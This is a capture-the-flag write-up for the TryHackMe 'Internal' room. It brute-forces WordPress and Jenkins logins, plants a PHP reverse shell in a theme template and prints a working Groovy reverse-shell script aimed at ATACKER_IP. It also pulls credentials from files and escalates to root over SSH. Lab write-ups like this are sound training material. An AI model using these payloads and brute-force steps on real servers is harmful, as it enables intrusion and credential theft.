# Internal

[Link to the room](https://tryhackme.com/room/internal) (Add `internal.thm` to `hosts` file before start!)

## Let's start!

First lets try to get what ports are open:

```
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7

```

Nice, now the typical `nmap` scan:

```

```

Just `ssh` and a default apache page... ok, lets start by checking that web.

### Webpage enumeration

First thing i want to try is gobuster to check for interesting directories:

```

```

A blog with wordpress and access to the phpmyadmin page. The phpmyadmin looks like doesn't allow login without password so let's check Wordpress. Let's use `wpscan` and `nmap`:

```

```

To be honest i first used `wpscan` to check for themes or installed plugins to check if some of them were outdated but wasn't really helpful so i tried a brute force attack with `rockyou` knowing that `xmlrpc` was enabled. Checking through the Wordpress i found that the admin user was called admin, yeah original, so we can just specify this as the username we want the password from:

```
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://internal.thm/blog/ --passwords rockyou.txt --usernames admin

```

Oh boy, oh boy! That actually worked cool! So we have admin access to Wordpress now with: `admin:my2boys`

#### Wordpress dashboard

Once here we can really just get a reverse shell but i found something. There is a private post in the Wordpress that contains something really interesting:

```
To-Do

Don't forget to reset Will's credentials. william:arnold147
```

So more credentials nice!: `william:arnold147` Before trying to get a reverse shell i will try the credentials we already know in `ssh`, remember that it was open. After some trying for a while i wasn't able to use them to login through `ssh`, sad, but hey we still can get a reverse shell so let's go for it.

##### Reverse shell

To get a reverse shell from Wordpress i will go to the theme editor and change the 404 page template with php reverse shell code. Once that is done, i setup my netcat listenner: `nc -lnvp 8080` and tried to access a non existant article in wordpress, i noticed that the `/wordpress` directory gobuster found just do that so let's go:

```
──(kali㉿kali)-[~]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.9.82.69] from (UNKNOWN) [internal.thm] 59962
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:22:28 up  1:27,  0 users,  load average: 0.00, 0.02, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

To stabilize the shell execute `python -c 'import pty; pty.spawn("/bin/bash")'`, then `ctrl-z` to suspend the process, execute `stty raw -echo; fg`, hit enter to get the reverse shell prompt again and lastly just `export TERM=xterm`.


### Privesc to user

First thing i want to check is if the wordpress installation has something for me, this is what i got:

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'wordpress123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
```

I checked the database in the `/phpmyadmin` directory using this credentials but nothing interesting there. No interesting `SUID` files neither, and `linpeas` wasn't helping neither. After some manual enumeration i found something in the `opt` directory:

```
www-data@internal:/opt$ cat wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

So we got the user credentials: `aubreanna:bubb13guM!@#123` Just login to the accound and get the flag:
```
aubreanna@internal:~$ cat /home/aubreanna/user.txt 
THM{*******************}
```

### Privesc to root

First thing, during the first enumeration phase as www-data i couldn't really find something of interest to get root using exploits for outdated things so we will have to continue with the manual enumeration. Let's check our groups:

```
aubreanna@internal:~$ id
uid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)
```
That adm group will allow me to read logs so we can try that later if necessary. I also saw a `jenkins.txt` file in our `home` folder:

```
Internal Jenkins service is running on 172.17.0.2:8080
```

I will use `ssh` tunneling to access this from my machine, first:

```
ssh -N -p 22 aubreanna@internal.thm -L 2000:localhost:8080
```

Use aubreanna credentials and the jenkins server is now available from `localhost:2000`. After some basic enumeration a used metasploit to try a bruteforce attack in the default admin user:
```
msf> use auxiliary/scanner/http/jenkins_login
msf6 auxiliary(scanner/http/jenkins_login) > set RHOSTS localhost
RHOSTS => localhost
msf6 auxiliary(scanner/http/jenkins_login) > set TARGETURI /
TARGETURI => /
msf6 auxiliary(scanner/http/jenkins_login) > set RPORT 2000
RPORT => 2000

BLANK_PASSWORDS => true
msf6 auxiliary(scanner/http/jenkins_login) > set USERNAME admin
USERNAME => admin
msf6 auxiliary(scanner/http/jenkins_login) > set PASSWORD ""
PASSWORD => 
msf6 auxiliary(scanner/http/jenkins_login) > set PASS_FILE /home/kali/rockyou.txt
PASS_FILE => /home/kali/rockyou.txt

127.0.0.1:2000 - Login Successful: admin:spongebob <---
[*] Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Another reverse shell?

So the jenkins credentials are `admin:spongebob` cool. Let's get another reverse shell, just going to `Manage Jenkins` and then clicking on `Script Console` will send me to the `/script` path where using `Revsh.groovy` alongside a netcat listenner will give a shell:

```
String host="ATACKER_IP";
int port=8080;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8080           
listening on [any] 8080 ...
connect to [10.9.82.69] from (UNKNOWN) [internal.thm] 48720
ls
bin
boot
...
```

After the shell is stabilized let's start enumerating. Turns out this guys love the `opt` folder because again there is something interesting in there. This `note.txt` file contains this:

```
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123

```

Can this be true? That easy? Lets try to `ssh` into the machine with that credentials (According with `linpeas` root access is allowed):
```
┌──(kali㉿kali)-[~]
└─$ ssh root@internal.thm
root@internal.thm's password:
....
Last login: Mon Aug  3 19:59:17 2020 from 10.6.2.56
root@internal:~#
```

It worked omg! Let's get the flag:

```
root@internal:~# cat /root/root.txt 
THM{*******************}
```
